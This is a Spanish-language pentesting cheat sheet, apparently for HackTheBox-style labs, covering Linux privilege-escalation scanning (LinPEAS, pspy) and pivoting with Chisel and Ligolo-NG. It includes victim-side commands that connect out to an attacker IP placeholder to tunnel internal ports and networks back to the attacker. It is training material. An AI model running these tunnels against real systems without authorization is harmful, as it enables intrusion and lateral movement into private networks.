
# LINUX PRIVILEGE ESCALATION

Programas para escalar privilegios en sistemas Linux.




## [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) 🔗

Este programa es utilizado para escanear el sistema en busca de archivos interesantes, malas configuraciones e información del sistema.

#### COMANDOS

```
  ./linpeas.sh
```

## [pspy](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1) 🔗

En tiempo real podremos ver los procesos que se ejecutan y que usuario los ejecuta. Esto permitirá realizar ataques como **PATH HIJACKING**.

#### COMANDOS

```
  ./pspy
```


## [Chisel](https://github.com/jpillora/chisel/blob/master/README.md) 🔗

Seguramente ya conozcas este programa, sirve para realizar **Port Forwarding**, esto quiere decir que te podrás traer un puerto interno de la máquina víctima a tu propia máquina.

#### MÁQUINA ATACANTE
```
./chisel server --reverse -p 1234
```

#### MÁQUINA VÍCTIMA
```
./chisel client <IP-ATACANTE>:1234 R:*<PUERTO-ATACANTE>:127.0.0.1:*<PUERTO-VÍCTIMA>
```

- ***PUERTO-ATACANTE**: Este puerto es el que se abrirá en tu Localhost para acceder a la máquina víctima.
- ***PUERTO-VÍCTIMA**: Este puerto es el que "robas" a la víctima, si internamente tiene abierto el 127.0.0.1:3306 y quieres acceder a el a través del 9999 el comando sería:

#### EJEMPLO
```
./chisel client <IP-ATACANTE>:1234 R:9999:127.0.0.1:3306
```

## [Ligolo-NG](https://github.com/nicocha30/ligolo-ng/blob/master/README.md) 🔗

Esta herramienta es MUCHO mejor que Chisel, con ella puedes hacer **PortForwarding** a todos los puertos de una interfaz interna de la máquina víctima.

#### EJEMPLO
La dirección IP interna de la víctima es 172.16.198.10 y quieres tener conectividad directa con esta IP y el resto de la red.

#### MÁQUINA ATACANTE (Linux)
```
sudo ip tuntap add user <username-linux> mode tun ligolo
sudo ip link set ligolo up
ip route add 172.16.198.0/24 dev ligolo

./proxy -selfcert
```

<img src="https://raw.githubusercontent.com/DavidGrandeWeb/CyberTOOLS/main/Windows/IMG/Ligolo-interfaces.png" width="60%" height="60%"><br>

#### MÁQUINA VÍCTIMA (Linux)
```
./agent -connect <IP-ATACANTE>:11601 -ignore-cert
```

<img src="https://raw.githubusercontent.com/DavidGrandeWeb/CyberTOOLS/main/Windows/IMG/Ligolo-victima.png" width="60%" height="60%"><br>

#### MÁQUINA ATACANTE (Linux)
```
ligolo-ng » INFO[0037] Agent joined.                                 name="HTB\\svc-alfresco@FOREST" remote="10.10.10.161:53939"
ligolo-ng » 
ligolo-ng » session  # TIENES QUE ESCRIBIR 'session'.
? Specify a session : 1 - HTB\svc-alfresco@FOREST - 10.10.10.161:53939  #  AQUÍ ESCRIBES '1'.
ligolo-ng » start  # TIENES QUE ESCRIBIR 'start'.
```

<img src="https://raw.githubusercontent.com/DavidGrandeWeb/CyberTOOLS/main/Windows/IMG/Ligolo-session.png" width="60%" height="60%"><br>

## 🔗 Links
[![portfolio](https://img.shields.io/badge/my_portfolio-000?style=for-the-badge&logo=ko-fi&logoColor=white)](https://davidgrandeweb.com/)
[![linkedin](https://img.shields.io/badge/linkedin-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/david-grande-garc%C3%ADa-4586b1255/)

